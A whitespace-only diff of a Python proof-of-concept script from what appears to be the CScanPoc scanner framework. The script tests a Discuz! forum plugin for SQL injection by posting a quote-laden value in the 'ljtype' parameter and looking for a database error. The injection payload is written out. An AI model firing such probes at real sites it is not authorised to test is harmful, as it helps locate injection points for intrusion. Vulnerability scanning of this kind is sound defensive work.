@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Discuz_0034'  # 平台漏洞编号，留空
     name = 'Discuz! 插件注入'  # 漏洞名称
@@ -35,19 +36,20 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             payload = '/plugin.php?id=Network114NetWork114'
-            data = "formhash=ff95c190&ljtype=1&ljtype=1%27%22" 
+            data = "formhash=ff95c190&ljtype=1&ljtype=1%27%22"
             url = self.target + payload
             r = requests.post(url, data=data)
-             
+
             if 'Discuz! Database Error' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name, url=url))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
